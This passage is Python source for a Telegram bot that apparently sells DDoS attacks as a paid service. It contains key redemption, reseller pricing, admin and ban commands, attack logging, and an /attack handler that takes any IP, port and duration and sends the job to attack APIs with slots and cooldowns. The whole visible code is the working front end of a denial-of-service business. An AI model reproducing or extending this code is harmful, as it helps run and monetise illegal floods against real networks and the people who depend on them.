        '✅ ON' if get_ddos_protection() else '❌ OFF',
        '✅ Required' if get_channel_required() else '❌ Not Required',
        len(get_approved_groups())
    )
    response += "⚡ 𝗦𝗟𝗢𝗧𝗦\n• Max Concurrent Attacks: {}\n\n".format(len(get_enabled_apis()))
    response += "📢 𝗖𝗛𝗔𝗡𝗡𝗘𝗟\n• @DESTROYDDOSLODER\n• Status: {}\n• Toggle: /required_on /required_off\n\n".format('REQUIRED' if get_channel_required() else 'NOT REQUIRED')
    response += "🎬 𝗥𝗘𝗘𝗟 𝗙𝗘𝗔𝗧𝗨𝗥𝗘\n• Status: {}\n• Total Reels: {}\n• Commands: /reel_on, /reel_off, /addreel, /removereel, /listreels\n\n".format('ON' if get_reel_enabled() else 'OFF', len(get_reel_list()))
    response += "📡 𝗔𝗣𝗜 𝗠𝗔𝗡𝗔𝗚𝗘𝗠𝗘𝗡𝗧\n• Total APIs: {}\n• Enabled: {}\n• Commands: /addapi, /removeapi, /toggleapi, /testapi, /listapis, /apistats, /resetapi\n\n".format(len(get_api_list()), len(get_enabled_apis()))
    response += "Commands:\n/private_max <sec>\n/group_max <sec>\n/private_cooldown <sec>\n/group_cooldown <sec>\n/ddos_on /ddos_off\n/required_on /required_off\n/addgrp /removegrp"
    bot.reply_to(message, response)

# ============================================================
# ===== REDEEM KEY =====
# ============================================================

@bot.message_handler(commands=["redeem"])
def redeem_key_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    user_name = message.from_user.first_name
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /redeem <key>")
        return
    key_input = command_parts[1]
    key_doc = keys_collection.find_one({'key': key_input})
    if not key_doc:
        bot.reply_to(message, "❌ Invalid key!")
        return
    max_users = key_doc.get('max_users', 1)
    current_users = key_doc.get('current_users', 0)
    if key_doc['used'] and current_users >= max_users:
        bot.reply_to(message, "❌ Ye key pehle se use ho chuki hai!")
        return
    if key_doc.get('is_trail'):
        user_data = users_collection.find_one({'user_id': user_id})
        if user_data and user_data.get('key_expiry') and user_data['key_expiry'] > datetime.now():
            abuse_count = user_data.get('trail_abuse_count', 0) + 1
            users_collection.update_one({'user_id': user_id}, {'$set': {'trail_abuse_count': abuse_count}})
            if abuse_count == 1:
                bot.reply_to(message, "⚠️ Warning: Aap trail key se time extend nahi kar sakte!")
            else:
                ban_minutes = 10 * (2 ** (abuse_count - 2))
                ban_expiry = datetime.now() + timedelta(minutes=ban_minutes)
                users_collection.update_one({'user_id': user_id}, {'$set': {'banned': True, 'ban_type': 'temporary', 'ban_expiry': ban_expiry}})
                bot.reply_to(message, f"🚫 Trail key abuse ki wajah se aapko {ban_minutes} minutes ke liye ban kar diya gaya hai!")
            return
    user = users_collection.find_one({'user_id': user_id})
    reseller_username = key_doc.get('created_by_username') if key_doc.get('created_by_type') == 'reseller' else None
    if user and user.get('key_expiry') and user['key_expiry'] > datetime.now():
        new_expiry = user['key_expiry'] + timedelta(seconds=key_doc['duration_seconds'])
        users_collection.update_one({'user_id': user_id}, {'$set': {
            'key': key_input,
            'key_expiry': new_expiry,
            'key_duration_seconds': key_doc['duration_seconds'],
            'key_duration_label': key_doc['duration_label'],
            'redeemed_at': datetime.now(),
            'reseller_username': reseller_username
        }})
        new_current = current_users + 1
        if new_current >= max_users:
            keys_collection.update_one({'key': key_input}, {'$set': {'used': True, 'used_by': user_id, 'used_at': datetime.now(), 'current_users': new_current}})
        else:
            keys_collection.update_one({'key': key_input}, {'$set': {'used_at': datetime.now()}, '$inc': {'current_users': 1}})
        new_remaining = get_time_remaining(user_id)
        bot.reply_to(message, f"✅ Key Extended!\n\n🔑 Key: `{key_input}`\n⏰ Added: {key_doc['duration_label']}\n⏳ Total Time: {new_remaining}", parse_mode="Markdown")
    else:
        expiry_time = datetime.now() + timedelta(seconds=key_doc['duration_seconds'])
        users_collection.update_one({'user_id': user_id}, {'$set': {
            'user_id': user_id,
            'username': user_name,
            'key': key_input,
            'key_expiry': expiry_time,
            'key_duration_seconds': key_doc['duration_seconds'],
            'key_duration_label': key_doc['duration_label'],
            'redeemed_at': datetime.now(),
            'reseller_username': reseller_username
        }}, upsert=True)
        new_current = current_users + 1
        if new_current >= max_users:
            keys_collection.update_one({'key': key_input}, {'$set': {'used': True, 'used_by': user_id, 'used_at': datetime.now(), 'current_users': new_current}})
        else:
            keys_collection.update_one({'key': key_input}, {'$set': {'used_at': datetime.now()}, '$inc': {'current_users': 1}})
        remaining = get_time_remaining(user_id)
        bot.reply_to(message, f"✅ Key Redeemed!\n\n🔑 Key: `{key_input}`\n⏰ Duration: {key_doc['duration_label']}\n⏳ Time Left: {remaining}", parse_mode="Markdown")

@bot.message_handler(commands=["mykey"])
def my_key_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    user = users_collection.find_one({'user_id': user_id})
    if not user or not user.get('key'):
        bot.reply_to(message, "❌ Tumhare paas koi key nahi hai!")
        return
    if not has_valid_key(user_id):
        reseller_username = user.get('reseller_username')
        if reseller_username:
            bot.reply_to(message, f"❌ Key khatam ho gayi!\n\n🔄 Renew ke liye DM karo: @{reseller_username}", parse_mode="Markdown")
        else:
            bot.reply_to(message, "❌ Key khatam ho gayi!")
        return
    remaining = get_time_remaining(user_id)
    bot.reply_to(message, f"🔑 Key Details\n\n📌 Key: `{user['key']}`\n⏳ Remaining: {remaining}\n✅ Status: Active", parse_mode="Markdown")

# ============================================================
# ===== STATUS =====
# ============================================================

@bot.message_handler(commands=["status"])
def status_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    if not is_owner(user_id) and not has_valid_key(user_id):
        bot.reply_to(message, "❌ Pehle key purchase karo!")
        return
    
    response = generate_global_status_ui()
    sent_msg = bot.reply_to(message, response)
    
    def update_status_loop():
        for _ in range(30):
            time.sleep(2)
            if not active_attacks:
                break
            new_response = generate_global_status_ui()
            try:
                bot.edit_message_text(new_response, chat_id=sent_msg.chat.id, message_id=sent_msg.message_id)
            except:
                break
    
    if active_attacks:
        thread = threading.Thread(target=update_status_loop)
        thread.daemon = True
        thread.start()

# ============================================================
# ===== ATTACK WITH GROUP LIMIT FEATURE =====
# ============================================================

@bot.message_handler(commands=["attack"])
def handle_attack(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_group = message.chat.type not in ['private', 'personal']
    
    if is_group:
        if not check_group_approval(message):
            return
    else:
        if not has_valid_key(user_id):
            user = users_collection.find_one({'user_id': user_id})
            if user and user.get('reseller_username'):
                bot.reply_to(message, f"❌ Key khatam ho gayi!\n🔄 Renew ke liye DM karo: @{user.get('reseller_username')}")
            else:
                bot.reply_to(message, "❌ Tumhare paas valid key nahi hai!\n🔑 Key kharidne ke liye reseller se contact karo.")
            return
    
    if protection.is_ddos_attack(user_id, message.chat.id):
        bot.reply_to(message, "🚫 DDoS Protection: Too many requests! Wait 5 seconds.")
        return
    if not check_channel_join(message):
        return
    
    if not is_owner(user_id):
        fb = get_pending_feedback(user_id)
        if fb:
            bot.reply_to(message, f"📸 Pehle attack ka screenshot bhejo!\n🎯 {fb['target']}:{fb['port']} ⏱️ {fb['duration']}s")
            return
        cooldown = get_user_cooldown(user_id, is_group)
        if cooldown > 0:
            bot.reply_to(message, f"⏳ Cooldown active! Wait: {cooldown}s")
            return
        if user_has_active_attack(user_id):
            bot.reply_to(message, "❌ Tumhara pehle se ek attack chal raha hai!")
            return
    
    active_count = get_active_attack_count()
    max_concurrent = len(get_enabled_apis())
    if active_count >= max_concurrent:
        bot.reply_to(message, f"❌ All slots busy! ({active_count}/{max_concurrent})\n📊 /status se check kro")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 4:
        if is_group:
            bot.reply_to(message, f'''⚠️ 𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗖𝗢𝗠𝗠𝗔𝗡𝗗!

📌 𝗨𝗦𝗔𝗚𝗘: /attack <ip> <port> <time>

━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ 𝗚𝗥𝗢𝗨𝗣 𝗠𝗢𝗗𝗘
• Max Time: {get_group_max_attack_time()}s
• Cooldown: {get_group_cooldown()}s
• Key Required: ❌ NO
━━━━━━━━━━━━━━━━━━━━━━━━━
🛡️ DDoS: {'ON' if get_ddos_protection() else 'OFF'}
📢 Channel: {'✅ Required' if get_channel_required() else '❌ Not Required'}
🔢 Max Slots: {len(get_enabled_apis())}
🎬 Reel: {'ON' if get_reel_enabled() else 'OFF'}
━━━━━━━━━━━━━━━━━━━━━━━━━
📊 /status - Check active attacks''')
        else:
            bot.reply_to(message, f'''⚠️ 𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗖𝗢𝗠𝗠𝗔𝗡𝗗!

📌 𝗨𝗦𝗔𝗚𝗘: /attack <ip> <port> <time>

━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ 𝗣𝗥𝗜𝗩𝗔𝗧𝗘 𝗠𝗢𝗗𝗘
• Max Time: {get_private_max_attack_time()}s
• Cooldown: {get_private_cooldown()}s
• Key Required: ✅ YES
━━━━━━━━━━━━━━━━━━━━━━━━━
🛡️ DDoS: {'ON' if get_ddos_protection() else 'OFF'}
📢 Channel: {'✅ Required' if get_channel_required() else '❌ Not Required'}
🔢 Max Slots: {len(get_enabled_apis())}
🎬 Reel: {'ON' if get_reel_enabled() else 'OFF'}
━━━━━━━━━━━━━━━━━━━━━━━━━
📊 /status - Check active attacks''')
        return
    
    target, port, duration = command_parts[1], command_parts[2], command_parts[3]
    if not validate_target(target):
        bot.reply_to(message, "❌ Invalid IP! Use format: 192.168.1.1")
        return
    if is_ip_blocked(target):
        bot.reply_to(message, "🚫 Ye IP blocked hai! Dusra IP use karo.")
        return
    try:
        port = int(port)
        if port < 1 or port > 65535:
            bot.reply_to(message, "❌ Invalid port! (1-65535)")
            return
        duration = int(duration)
        if is_group:
            max_time = get_group_max_attack_time()
            cooldown_time = get_group_cooldown()
            # ===== GROUP TIME LIMIT CHECK WITH PAID MESSAGE =====
            if not is_owner(user_id) and duration > max_time:
                bot.reply_to(message, 
                    f"❌ 𝗚𝗥𝗢𝗨𝗣 𝗧𝗜𝗠𝗘 𝗟𝗜𝗠𝗜𝗧 𝗘𝗫𝗖𝗘𝗘𝗗𝗘𝗗!\n\n"
                    f"📌 Group mein max {max_time}s attack kar sakte ho!\n"
                    f"⏰ Aapne {duration}s daala hai.\n\n"
                    f"⚡ 𝗜𝗦𝗦𝗘 𝗭𝗬𝗔𝗗𝗔 𝗧𝗜𝗠𝗘 𝗞𝗔 𝗔𝗧𝗧𝗔𝗖𝗞 𝗞𝗔𝗥𝗡𝗔 𝗛𝗔𝗜 𝗧𝗢 𝗣𝗔𝗜𝗗 𝗞𝗘𝗬 𝗟𝗘𝗡𝗔 𝗛𝗢𝗚𝗔!\n\n"
                    f"💎 𝗣𝗔𝗜𝗗 𝗞𝗘𝗬 𝗞𝗘 𝗟𝗜𝗬𝗘 𝗗𝗠 𝗞𝗔𝗥𝗢:\n"
                    f"📞 {PAID_CONTACT}\n\n"
                    f"🔑 Private mode mein unlimited time attack possible hai!\n"
                    f"💰 Affordable rates - DM now!"
                )
                return
        else:
            max_time = get_private_max_attack_time()
            cooldown_time = get_private_cooldown()
            if not is_owner(user_id) and duration > max_time:
                bot.reply_to(message, f"❌ Max time: {max_time}s")
                return
        attack_id = f"{user_id}_{datetime.now().timestamp()}"
        api_index = get_free_api_index()
        if api_index is None:
            bot.reply_to(message, "❌ Koi free slot nahi mila! Wait karo.")
            return
        with _attack_lock:
            user_cooldowns[user_id] = datetime.now() + timedelta(seconds=cooldown_time + duration)
            if user_id not in user_attack_history:
                user_attack_history[user_id] = {}
            user_attack_history[user_id][f"{target}:{port}"] = datetime.now()
            api_in_use[attack_id] = api_index
            active_attacks[attack_id] = {
                'target': target,
                'port': port,
                'duration': duration,
                'user_id': user_id,
                'start_time': datetime.now(),
                'end_time': datetime.now() + timedelta(seconds=duration)
            }
        thread = threading.Thread(target=start_attack, args=(target, port, duration, message, attack_id, api_index, is_group))
        thread.start()
    except ValueError:
        bot.reply_to(message, "❌ Port and time must be numbers!")

# ============================================================
# ===== HELP =====
# ============================================================

@bot.message_handler(commands=['help'])
def show_help(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    if is_owner(user_id):
        help_text = f'''
👑 OWNER PANEL

🔑 KEY MGMT: /gen, /key, /allkeys, /delkey, /delete_key, /del_exp_key, /trail, /reseller_trail, /del_trail
👥 USER MGMT: /user, /allusers, /extend, /extend_all, /down, /del_exp_usr, /ban, /unban, /banned, /tban
💼 RESELLER: /add_reseller, /remove_reseller, /block_reseller, /unblock_reseller, /all_resellers, /saldo_add, /saldo_remove, /saldo, /user_resell, /setprice
📢 BROADCAST: /broadcast, /broadcast_reseller, /broadcast_paid
⚡ ATTACK: /attack, /status, /settings, /private_max, /group_max, /private_cooldown, /group_cooldown
🛡️ PROTECTION: /ddos_on, /ddos_off, /required_on, /required_off
📢 GROUP: /addgrp, /removegrp, /groups, /channels
🎬 REEL: /reel_on, /reel_off, /addreel, /removereel, /listreels
📡 API: /addapi, /removeapi, /toggleapi, /testapi, /listapis, /apistats, /resetapi
📊 MONITOR: /live, /logs, /del_logs
🔧 MAINTENANCE: /maintenance, /ok

🔢 Max Concurrent Attacks: {len(get_enabled_apis())}
'''
    elif is_reseller(user_id):
        help_text = f'''
💼 RESELLER PANEL

🆔 ID: /id, /ping
💰 BALANCE: /mysaldo, /prices
🔑 KEY GEN: /gen <duration> <count>
⚡ ATTACK: /redeem, /attack, /status, /mykey
🔢 Max Concurrent Attacks: {len(get_enabled_apis())}
'''
    else:
        help_text = f'''
🔐 USER COMMANDS

• /id - Your ID
• /ping - Bot status
• /verify - Check channel membership
• /redeem <key> - Redeem key
• /mykey - Key details
• /status - Attack status
• /attack <ip> <port> <time> - Start attack

⚡ Limits:
• Private: Max {get_private_max_attack_time()}s (Key required)
• Groups: Max {get_group_max_attack_time()}s (NO key)
• Private Cooldown: {get_private_cooldown()}s
• Group Cooldown: {get_group_cooldown()}s
• Max Concurrent: {len(get_enabled_apis())}

📢 Channel: {'REQUIRED' if get_channel_required() else 'NOT REQUIRED'}
🎬 Reels play with every attack!
📸 After attack, send screenshot to enable next attack!

💎 𝗣𝗔𝗜𝗗 𝗞𝗘𝗬 𝗞𝗘 𝗟𝗜𝗬𝗘 𝗗𝗠 𝗞𝗔𝗥𝗢: {PAID_CONTACT}
'''
    bot.reply_to(message, help_text)

# ============================================================
# ===== OTHER COMMANDS =====
# ============================================================

@bot.message_handler(commands=["delete_key"])
def delete_key_alt_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /delete_key <key>")
        return
    key_input = command_parts[1]
    result = keys_collection.delete_one({'key': key_input})
    if result.deleted_count > 0:
        users_collection.update_one({'key': key_input}, {'$set': {'key': None, 'key_expiry': None}})
        bot.reply_to(message, f"✅ Key `{key_input}` deleted!", parse_mode="Markdown")
    else:
        bot.reply_to(message, "❌ Key nahi mili!")

@bot.message_handler(commands=["del_trail"])
def delete_trail_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) == 1:
        bot.reply_to(message, "⚠️ Confirm: /del_trail confirm")
        return
    if command_parts[1].lower() == "confirm":
        result = keys_collection.delete_many({'is_trail': True})
        bot.reply_to(message, f"✅ {result.deleted_count} trail keys delete ho gayi!")
    else:
        bot.reply_to(message, "❌ Confirmation failed! /del_trail confirm")

@bot.message_handler(commands=["tban"])
def tban_user_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) != 3:
        bot.reply_to(message, "⚠️ Usage: /tban <id> <time>")
        return
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        bot.reply_to(message, "❌ User nahi mila!")
        return
    if target_user_id == BOT_OWNER:
        bot.reply_to(message, "❌ Owner ko ban nahi kar sakte!")
        return
    duration_str = command_parts[2]
    duration_td, label = parse_duration(duration_str)
    if not duration_td:
        bot.reply_to(message, "❌ Invalid duration! Use: 10m, 1h, 1d")
        return
    ban_expiry = datetime.now() + duration_td
    users_collection.update_one({'user_id': target_user_id}, {'$set': {'banned': True, 'ban_type': 'temporary', 'ban_expiry': ban_expiry}}, upsert=True)
    bot.reply_to(message, f"🚫 User {resolved_name or target_user_id} ko {label} ke liye ban kar diya!\n⏳ Expiry: {ban_expiry.strftime('%d-%m-%Y %H:%M:%S')}")

@bot.message_handler(commands=["ban"])
def ban_user_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /ban <id>")
        return
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        bot.reply_to(message, "❌ User nahi mila!")
        return
    if target_user_id == BOT_OWNER:
        bot.reply_to(message, "❌ Owner ko ban nahi kar sakte!")
        return
    users_collection.update_one({'user_id': target_user_id}, {'$set': {'user_id': target_user_id, 'username': resolved_name, 'banned': True, 'banned_at': datetime.now()}}, upsert=True)
    try:
        bot.send_message(target_user_id, "🚫 Aapko ban kar diya gaya hai!")
    except:
        pass
    display = f"@{resolved_name}" if resolved_name else str(target_user_id)
    bot.reply_to(message, f"✅ User {display} banned!\n🆔 ID: {target_user_id}")

@bot.message_handler(commands=["unban"])
def unban_user_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /unban <id>")
        return
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        bot.reply_to(message, "❌ User nahi mila!")
        return
    result = users_collection.update_one({'user_id': target_user_id}, {'$set': {'banned': False}})
    display = f"@{resolved_name}" if resolved_name else str(target_user_id)
    if result.modified_count > 0:
        try:
            bot.send_message(target_user_id, "✅ Aapka ban hata diya gaya hai!")
        except:
            pass
        bot.reply_to(message, f"✅ User {display} unbanned!\n🆔 ID: {target_user_id}")
    else:
        bot.reply_to(message, "❌ User nahi mila ya pehle se unbanned hai!")

@bot.message_handler(commands=["banned"])
def list_banned_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    banned_users = list(users_collection.find({'banned': True}))
    if not banned_users:
        bot.reply_to(message, "📋 Koi banned user nahi hai!")
        return
    response = "═══════════════════════════\n🚫 BANNED USERS\n═══════════════════════════\n\n"
    for i, user in enumerate(banned_users[:20], 1):
        response += f"{i}. 👤 `{user['user_id']}`\n"
        if user.get('username'):
            response += f"   📛 {user['username']}\n"
    response += f"\n═══════════════════════════\n📊 Total Banned: {len(banned_users)}"
    send_long_message(message, response)

@bot.message_handler(commands=["user"])
def user_info_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /user <id>")
        return
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        bot.reply_to(message, "❌ User nahi mila!")
        return
    user = users_collection.find_one({'user_id': target_user_id})
    reseller = resellers_collection.find_one({'user_id': target_user_id})
    bot_user = bot_users_collection.find_one({'user_id': target_user_id})
    response = "═══════════════════════════\n👤 USER INFO\n═══════════════════════════\n\n"
    response += f"🆔 ID: <code>{target_user_id}</code>\n"
    if resolved_name:
        response += f"📛 Username: @{resolved_name}\n"
    if bot_user:
        if bot_user.get('first_name'):
            response += f"👤 Name: {bot_user.get('first_name')}\n"
        if bot_user.get('first_seen'):
            response += f"📅 First Seen: {bot_user['first_seen'].strftime('%d-%m-%Y %H:%M')}\n"
    if target_user_id == BOT_OWNER:
        response += "\n👑 Role: OWNER\n"
    elif reseller:
        response += f"\n💼 Role: RESELLER\n💰 Balance: {reseller.get('balance', 0)} Rs\n🔑 Keys Generated: {reseller.get('total_keys_generated', 0)}\n📊 Status: {'🚫 Blocked' if reseller.get('blocked') else '✅ Active'}\n"
    else:
        response += "\n👤 Role: USER\n"
    if user:
        response += "\n═══════════════════════════\n🔑 KEY DETAILS\n═══════════════════════════\n\n"
        if user.get('banned'):
            response += "🚫 STATUS: BANNED\n"
        if user.get('key'):
            response += f"🔑 Key: <code>{user['key']}</code>\n⏰ Duration: {user.get('key_duration_label', 'N/A')}\n"
            if user.get('redeemed_at'):
                response += f"📅 Redeemed: {user['redeemed_at'].strftime('%d-%m-%Y %H:%M')}\n"
            if user.get('key_expiry'):
                if user['key_expiry'] > datetime.now():
                    remaining = user['key_expiry'] - datetime.now()
                    days = remaining.days
                    hours, rem = divmod(remaining.seconds, 3600)
                    mins, secs = divmod(rem, 60)
                    response += f"⏳ Remaining: {days}d {hours}h {mins}m\n📆 Expires: {user['key_expiry'].strftime('%d-%m-%Y %H:%M')}\n✅ Status: ACTIVE\n"
                else:
                    response += f"📆 Expired: {user['key_expiry'].strftime('%d-%m-%Y %H:%M')}\n❌ Status: EXPIRED\n"
            if user.get('reseller_username'):
                response += f"💼 Reseller: @{user['reseller_username']}\n"
        else:
            response += "❌ No Active Key\n"
    else:
        response += "\n❌ No Key History\n"
    user_keys = list(keys_collection.find({'used_by': target_user_id}).sort('used_at', -1).limit(5))
    if user_keys:
        response += "\n═══════════════════════════\n📜 KEY HISTORY (Last 5)\n═══════════════════════════\n\n"
        for k in user_keys:
            response += f"• {k.get('duration_label', 'N/A')}"
            if k.get('used_at'):
                response += f" ({k['used_at'].strftime('%d-%m-%Y')})"
            response += "\n"
    attack_count = attack_logs_collection.count_documents({'user_id': target_user_id})
    user_attacks = list(attack_logs_collection.find({'user_id': target_user_id}).sort('timestamp', -1).limit(10))
    response += "\n═══════════════════════════\n⚔️ ATTACK STATS\n═══════════════════════════\n\n"
    response += f"📊 Total Attacks: {attack_count}\n"
    if user_attacks:
        response += "\n📜 Recent Attacks:\n"
        for i, atk in enumerate(user_attacks[:5], 1):
            response += f"{i}. {atk['target']}:{atk['port']} ({atk['duration']}s)\n"
            if atk.get('timestamp'):
                response += f"   📅 {atk['timestamp'].strftime('%d-%m-%Y %H:%M')}\n"
    fb = get_pending_feedback(target_user_id)
    if fb:
        response += "\n⚠️ Pending Feedback: YES\n"
    response += "\n═══════════════════════════"
    bot.reply_to(message, response, parse_mode="HTML")

@bot.message_handler(commands=["live"])
def live_stats_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    uptime = datetime.now() - BOT_START_TIME
    hours, remainder = divmod(int(uptime.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)
    uptime_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
    process = psutil.Process()
    memory_mb = process.memory_info().rss / 1024 / 1024
    cpu_percent = process.cpu_percent(interval=0.1)
    threads = process.num_threads()
    cpu_overall = psutil.cpu_percent(interval=0.1)
    ram = psutil.virtual_memory()
    ram_used = ram.used / 1024 / 1024
    ram_total = ram.total / 1024 / 1024
    ram_percent = ram.percent
    disk = psutil.disk_usage('/')
    disk_percent = disk.percent
    import platform
    system_info = f"{platform.system()} {platform.release()}"
    total_users = users_collection.count_documents({})
    active_users = users_collection.count_documents({'key_expiry': {'$gt': datetime.now()}})
    online_threshold = datetime.now() - timedelta(minutes=5)
    online_users = bot_users_collection.count_documents({'last_seen': {'$gt': online_threshold}})
    total_resellers = resellers_collection.count_documents({})
    active_keys = keys_collection.count_documents({'used': False})
    total_keys = keys_collection.count_documents({})
    active_count = get_active_attack_count()
    max_concurrent = len(get_enabled_apis())
    maint_status = "🔴 Enabled" if is_maintenance() else "✅ Disabled"
    channel_status = "✅ REQUIRED" if get_channel_required() else "❌ Not Required"
    ddos_status = "✅ ON" if get_ddos_protection() else "❌ OFF"
    group_count = len(get_approved_groups())
    reel_count = len(get_reel_list())
    reel_status = "✅ ON" if get_reel_enabled() else "❌ OFF"
    api_count = len(get_enabled_apis())
    response = "═══════════════════════════\n📊 SERVER STATS\n═══════════════════════════\n\n"
    response += "🤖 BOT INFO\n• Uptime: {uptime_str}\n• Memory: {memory_mb:.1f} MB\n• CPU: {cpu_percent:.1f}%\n• Threads: {threads}\n\n"
    response += "💻 SYSTEM\n• {system_info}\n• CPU: {cpu_overall:.1f}% overall\n• RAM: {ram_percent:.1f}% ({ram_used:.0f}MB/{ram_total:.0f}MB)\n• Disk: {disk_percent:.1f}%\n\n"
    response += f"• Active Attacks: {active_count}/{max_concurrent}\n• Maintenance: {maint_status}\n• Channel: {channel_status}\n• DDoS: {ddos_status}\n• Groups: {group_count}\n• Reels: {reel_count} ({reel_status})\n• APIs: {api_count} enabled\n\n"
    response += "📈 DATA\n• Total Users: {total_users}\n• Active Users (Keys): {active_users}\n• Online Users: {online_users}\n• Resellers: {total_resellers}\n• Available Keys: {active_keys}\n• Total Keys: {total_keys}\n\n"
    response += "⚙️ SETTINGS\n• Private Max Time: {get_private_max_attack_time()}s\n• Group Max Time: {get_group_max_attack_time()}s\n• Private Cooldown: {get_private_cooldown()}s\n• Group Cooldown: {get_group_cooldown()}s"
    response += "\n\n═══════════════════════════"
    bot.reply_to(message, response.format(**locals()))

@bot.message_handler(commands=["setprice"])
def set_price_command(message):
    global RESELLER_PRICING
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) == 1:
        response = "═══════════════════════════\n💵 CURRENT PRICING\n═══════════════════════════\n\n"
        for dur, info in RESELLER_PRICING.items():
            response += f"• {dur}: {info['price']} Rs ({info['label']})\n"
        response += "\n⚠️ Usage: /setprice <duration> <price>\nExample: /setprice 1d 60"
        bot.reply_to(message, response)
        return
    if len(command_parts) != 3:
        bot.reply_to(message, "⚠️ Usage: /setprice <duration> <price>")
        return
    duration_key = command_parts[1].lower()
    if duration_key not in RESELLER_PRICING:
        bot.reply_to(message, "❌ Invalid duration! Valid: 12h, 1d, 3d, 7d, 30d, 60d")
        return
    try:
        new_price = int(command_parts[2])
        if new_price < 0:
            bot.reply_to(message, "❌ Price 0 se kam nahi ho sakta!")
            return
    except:
        bot.reply_to(message, "❌ Invalid price!")
        return
    old_price = RESELLER_PRICING[duration_key]['price']
    RESELLER_PRICING[duration_key]['price'] = new_price
    set_setting(f'price_{duration_key}', new_price)
    update_reseller_pricing()
    bot.reply_to(message, f"✅ Price Updated!\n📦 {RESELLER_PRICING[duration_key]['label']}\n💵 Old: {old_price} Rs\n💰 New: {new_price} Rs")

@bot.message_handler(commands=["logs"])
def attack_logs_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    all_logs = list(attack_logs_collection.find().sort('timestamp', -1))
    if not all_logs:
        bot.reply_to(message, "📋 Koi attack logs nahi hai!")
        return
    content = "═══════════════════════════\n       ATTACK LOGS REPORT\n" + f"    Generated: {datetime.now().strftime('%d-%m-%Y %H:%M')}\n" + "═══════════════════════════\n\nTotal Attacks: {len(all_logs)}\n\n───────────────────────────\n"
    for i, log in enumerate(all_logs, 1):
        content += f"{i}. {log.get('username', 'Unknown')} ({log.get('user_id', 'N/A')})\n   Target: {log.get('target', 'N/A')}:{log.get('port', 'N/A')}\n   Duration: {log.get('duration', 'N/A')}s\n"
        if log.get('timestamp'):
            content += f"   Time: {log['timestamp'].strftime('%d-%m-%Y %H:%M:%S')}\n"
        content += "\n"
    content += "═══════════════════════════\nEND OF LOGS - Total: {len(all_logs)}\n═══════════════════════════"
    import io
    file = io.BytesIO(content.encode('utf-8'))
    file.name = f"attack_logs_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    bot.send_document(message.chat.id, file, caption=f"📊 Attack Logs\n\n⚔️ Total Attacks: {len(all_logs)}")

@bot.message_handler(commands=["del_logs"])
def delete_logs_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    count = attack_logs_collection.count_documents({})
    if count == 0:
        bot.reply_to(message, "📋 Koi logs nahi hai!")
        return
    attack_logs_collection.delete_many({})
    bot.reply_to(message, f"✅ {count} attack logs delete ho gaye!")

@bot.message_handler(commands=["block_ip"])
def block_ip_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /block_ip <ip_prefix>\nExample: /block_ip 96.")
        return
    ip_prefix = command_parts[1]
    if add_blocked_ip(ip_prefix):
        bot.reply_to(message, f"✅ IP Blocked!\n🚫 Prefix: `{ip_prefix}`*")
    else:
        bot.reply_to(message, f"ℹ️ `{ip_prefix}` already blocked!")

@bot.message_handler(commands=["unblock_ip"])
def unblock_ip_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
